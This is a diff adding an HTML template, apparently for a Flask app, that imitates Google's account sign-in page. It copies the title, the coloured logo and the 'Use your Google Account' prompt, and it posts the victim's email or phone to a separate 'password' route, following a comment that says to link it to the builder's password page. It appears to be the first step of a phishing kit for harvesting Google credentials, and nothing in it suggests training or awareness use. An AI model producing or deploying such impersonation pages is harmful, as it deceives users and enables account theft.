@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { display: flex; align-items: center; justify-content: center; min-height: 100vh; background-color: #f8f9fa; }
+        .login-container { background: #fff; width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { font-size: 24px; font-weight: 500; margin-bottom: 10px; }
+        .logo span:nth-child(1) { color: #4285F4; } .logo span:nth-child(2) { color: #EA4335; }
+        .logo span:nth-child(3) { color: #FBBC05; } .logo span:nth-child(4) { color: #4285F4; }
+        .logo span:nth-child(5) { color: #34A853; } .logo span:nth-child(6) { color: #EA4335; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
+        p { margin-bottom: 40px; font-size: 16px; }
+        .input-group { margin-bottom: 10px; text-align: left; }
+        input[type="text"] { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .footer-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .btn-link { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
+        .btn-primary { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+        <!-- Link this to your password page or server route -->
+        <form action="{{ url_for('password') }}"method="POST">
+            <h1>Sign in</h1>
+            <p>Use your Google Account</p>
+            <div class="input-group">
+                <input type="text" name="username" placeholder="Email or phone" required autofocus >
+            </div>
+            <div class="footer-actions">
+                <a href="#" class="btn-link">Create account</a>
+                <button type="submit" class="btn-primary">Next</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
